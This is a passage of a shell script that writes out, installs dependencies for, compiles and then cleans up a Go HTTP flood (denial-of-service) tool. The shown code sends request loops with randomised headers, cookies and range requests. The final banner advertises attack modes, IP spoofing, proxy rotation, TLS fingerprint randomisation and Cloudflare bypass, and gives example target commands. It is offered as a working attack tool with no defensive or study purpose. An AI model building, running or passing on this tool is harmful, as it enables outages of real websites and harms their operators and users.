								req.Header.Set(k, "Bearer "+randomString(48))
							case "X-API-Key":
								req.Header.Set(k, randomString(24))
							case "X-Device-ID", "X-Session-ID":
								req.Header.Set(k, randomString(32))
							}
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			// CDN Headers
			if randInt(1, 100) <= 40 {
				cdnHeader := cdnHeaders[randInt(0, len(cdnHeaders)-1)]
				for k, v := range cdnHeader {
					req.Header.Set(k, v)
				}
			}

			// Cookies
			if randInt(1, 100) <= 60 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			// Range requests
			if randInt(1, 100) <= 20 {
				req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", randInt(0, 1000), randInt(1001, 100000)))
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile with optimizations
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with optimizations...${NC}"
go build -ldflags="-s -w" -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW|ALL> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST proxy${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 ALL${NC}"
    echo -e "   ${YELLOW}./main https://target.com 300 SLOW${NC}"
    echo
    echo -e " ${CYAN}Features:${NC}"
    echo -e "   • JA3/TLS fingerprint randomization"
    echo -e "   • Automatic proxy rotation & refresh"
    echo -e "   • IP spoofing (X-Forwarded-For, etc.)"
    echo -e "   • Cloudflare bypass headers"
    echo -e "   • 200+ modern User-Agents"
    echo -e "   • Multiple attack modes including ALL"
    echo -e "   • Connection pooling with 1000+ connections"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
